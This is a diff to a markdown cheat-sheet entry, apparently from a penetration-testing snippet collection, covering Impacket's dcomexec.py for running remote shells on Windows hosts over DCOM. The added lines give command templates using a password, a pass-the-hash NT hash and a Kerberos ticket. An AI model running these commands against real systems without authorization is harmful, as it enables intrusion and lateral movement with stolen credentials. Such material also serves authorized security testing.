@@ -1,20 +1,25 @@
-# dcomexec (imp)
+# dcomexec.py (imp)
 
 % windows, impacket-exec, dcom
 
-## dcomexec
-#plateform/linux #target/remote #port/135 #protocol/wmi #cat/ATTACK/CONNECT  
-Execute a command shell without touching the disk or running a new service using DCOM
+#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
 
+## desc
 ```
-dcomexec.py -shell-type powershell '<domain_fqdn>/<user>:<password>'@<ip>
+Execute a command or semi interactive shell without touching the disk or running a new service using DCOM
 ```
 
-## pth 
-#plateform/linux #target/remote #port/135 #protocol/wmi #cat/ATTACK/CONNECT  
-
-Execute a command shell without touching the disk or running a new service using DCOM
-
+## execute (creds)
+```bash
+dcomexec.py -debug -shell-type powershell <domain_fqdn>/<user>:'<password>'@<target_fqdn> <cmd|>
 ```
-dcomexec.py -shell-type powershell -hashes <nt_hash> <user>@<ip>
+
+## execute (pth)
+```bash
+dcomexec.py -debug -shell-type powershell -hashes :<nt_hash> <domain_fqdn>/<user>@<target_fqdn> <cmd|>
+```
+
+## execute (ptt)
+```bash
+KRB5CCNAME=<ccache> dcomexec.py -debug -shell-type powershell -no-pass -k <target_fqdn> <cmd|>
 ```
